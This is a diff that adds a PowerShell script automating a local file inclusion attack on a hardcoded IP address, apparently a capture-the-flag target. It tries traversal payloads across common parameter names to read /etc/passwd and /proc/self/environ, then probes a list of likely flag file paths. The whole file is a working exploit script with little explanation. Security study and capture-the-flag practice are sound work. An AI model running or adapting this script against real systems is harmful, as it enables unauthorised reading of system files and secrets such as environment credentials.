@@ -1,0 +1,66 @@
+# FAST LFI PARAM + PAYLOAD CHECKER
+$BASE = "http://52.59.124.14:5020"
+
+# very small, high-signal param set
+$params = @("file","path","page","template","view","include","dog","breed","img","image")
+
+# short traversal patterns
+$trav = @("../","..%2f","....//")   # '....//' collapses to '../' in many PHP setups
+$up = 1..6
+$probes = @("etc/passwd","proc/self/environ","proc/self/cmdline")
+
+$found = $null
+
+Write-Host "[*] Scanning for a working LFI param..." -ForegroundColor Cyan
+
+foreach ($p in $params) {
+  foreach ($t in $trav) {
+    foreach ($u in $up) {
+      $prefix = ($t * $u)
+      foreach ($probe in $probes) {
+        $payload = $prefix + $probe
+        try {
+          $r = Invoke-WebRequest -Uri "$BASE/?$p=$payload" -UseBasicParsing -TimeoutSec 6
+          $body = $r.Content
+        } catch { continue }
+
+        if ($body -and ($body -match "root:x:" -or $body -match "PATH=" -or $body -match "HTTP_")) {
+          Write-Host "[+] LFI confirmed: param=$p payload=$payload" -ForegroundColor Green
+          $found = @{ param=$p; prefix=$prefix }
+          break
+        }
+      }
+      if ($found) { break }
+    }
+    if ($found) { break }
+  }
+  if ($found) { break }
+}
+
+if (-not $found) {
+  Write-Host "[-] No LFI yet. Try php filter step next." -ForegroundColor Yellow
+  exit
+}
+
+# Try a few common flag locations, quick and tight
+$flagPaths = @(
+  "flag","flag.txt","FLAG","FLAG.txt",
+  "var/www/html/flag.txt","var/www/flag.txt","app/flag.txt",
+  "srv/flag.txt","tmp/flag.txt","home/ctf/flag.txt","home/flag.txt","root/flag.txt"
+)
+
+foreach ($path in $flagPaths) {
+  $payload = $found.prefix + $path
+  try {
+    $r = Invoke-WebRequest -Uri "$BASE/?$($found.param)=$payload" -UseBasicParsing -TimeoutSec 6
+    $body = $r.Content
+  } catch { continue }
+
+  if ($body -and ($body -match "ENO\{" -or $body -match "CTF\{" -or $body -match "flag\{")) {
+    Write-Host "`n[✓] FLAG FOUND:" -ForegroundColor Green
+    $body | Write-Output
+    exit
+  }
+}
+
+Write-Host "[-] Flag not in common spots. Try php filter to read source code next." -ForegroundColor Yellow
